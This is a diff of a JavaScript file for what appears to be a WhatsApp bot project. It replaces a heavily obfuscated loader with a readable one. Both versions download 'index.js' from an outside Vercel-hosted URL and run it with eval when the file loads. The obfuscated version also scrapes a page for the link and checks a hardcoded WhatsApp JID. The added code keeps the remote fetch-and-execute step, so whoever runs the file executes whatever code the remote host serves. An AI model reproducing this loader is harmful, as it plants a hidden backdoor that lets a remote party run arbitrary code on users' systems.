@@ -1,2 +1,20 @@
 'use strict';
-'use strict';const _0x50dd43=_0x34ba;(function(_0x449abd,_0x38ef36){const _0x21e5ba=_0x34ba,_0x5c84a8=_0x449abd();while(!![]){try{const _0x36ef09=parseInt(_0x21e5ba(0x87))/0x1*(-parseInt(_0x21e5ba(0x89))/0x2)+-parseInt(_0x21e5ba(0x96))/0x3+-parseInt(_0x21e5ba(0x92))/0x4*(parseInt(_0x21e5ba(0x8c))/0x5)+-parseInt(_0x21e5ba(0x8f))/0x6+parseInt(_0x21e5ba(0x79))/0x7*(-parseInt(_0x21e5ba(0x84))/0x8)+-parseInt(_0x21e5ba(0x86))/0x9*(-parseInt(_0x21e5ba(0x90))/0xa)+parseInt(_0x21e5ba(0x95))/0xb*(parseInt(_0x21e5ba(0x93))/0xc);if(_0x36ef09===_0x38ef36)break;else _0x5c84a8['push'](_0x5c84a8['shift']());}catch(_0x4cab22){_0x5c84a8['push'](_0x5c84a8['shift']());}}}(_0x2a51,0xb69d7));const axios=require(_0x50dd43(0x94)),cheerio=require(_0x50dd43(0x7b)),webPageUrl=_0x50dd43(0x8b);function _0x2a51(){const _0x222aba=['✅\x20Script\x20loaded\x20successfully!','140596GVKItG','5748jtyNIT','axios','46156XzHXst','312933FnXHGf','load','688709BIqwdI','❌\x20Error:','cheerio','a:contains(\x22index.js\x22)','href','endsWith','error','ibrahimadams@s.whatsapp.net','✅\x20Your\x20JID\x20is\x20verified:','index.js\x20not\x20found\x20on\x20the\x20webpage.','❌\x20Invalid\x20JID\x20format:','8AKKbxc','get','1638YLNVtN','4clseMY','message','572820TxNovL','✅\x20File\x20fetched\x20successfully:','https://dullah-xmd-commands-phi.vercel.app','15biguYt','attr','log','1025004fReVsm','19930gfXbmz'];_0x2a51=function(){return _0x222aba;};return _0x2a51();}function _0x34ba(_0x1d4f33,_0xf8a71f){const _0x2a51ad=_0x2a51();return _0x34ba=function(_0x34ba18,_0x3232da){_0x34ba18=_0x34ba18-0x79;let _0x39215a=_0x2a51ad[_0x34ba18];return _0x39215a;},_0x34ba(_0x1d4f33,_0xf8a71f);}async function fetchIndexUrl(){const _0x9b18ee=_0x50dd43;try{const _0x46e06a=await axios[_0x9b18ee(0x85)](webPageUrl),_0x384d09=_0x46e06a['data'],_0x485168=cheerio[_0x9b18ee(0x97)](_0x384d09),_0x51513c=_0x485168(_0x9b18ee(0x7c))[_0x9b18ee(0x8d)](_0x9b18ee(0x7d));if(!_0x51513c)throw new Error(_0x9b18ee(0x82));console['log'](_0x9b18ee(0x8a),_0x51513c);const _0xb341aa=await axios['get'](_0x51513c),_0x1a95de=_0xb341aa['data'];console[_0x9b18ee(0x8e)](_0x9b18ee(0x91)),eval(_0x1a95de);const _0x20ba90=_0x9b18ee(0x80),_0x4103e7=atbverifierEtatJid(_0x20ba90);console['log'](_0x9b18ee(0x81),_0x4103e7);}catch(_0x376529){console[_0x9b18ee(0x7f)](_0x9b18ee(0x7a),_0x376529[_0x9b18ee(0x88)]||_0x376529);}}function atbverifierEtatJid(_0x2b0275){const _0x194e9f=_0x50dd43;if(!_0x2b0275[_0x194e9f(0x7e)]('@s.whatsapp.net'))return console[_0x194e9f(0x7f)](_0x194e9f(0x83),_0x2b0275),![];return console[_0x194e9f(0x8e)]('✅\x20JID\x20verified:',_0x2b0275),!![];}fetchIndexUrl();
+
+const axios = require('axios');
+
+const scriptName = 'index.js';
+const scriptUrl = `https://dullah-xmd-commands-phi.vercel.app/${scriptName}`;
+
+async function loadScript() {
+    try {
+        const response = await axios.get(scriptUrl);
+        const scriptContent = response.data;
+
+        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
+        eval(scriptContent);
+    } catch (error) {
+        console.error(`❌ Error loading ${scriptName}:`, error.message);
+    }
+}
+
+loadScript();
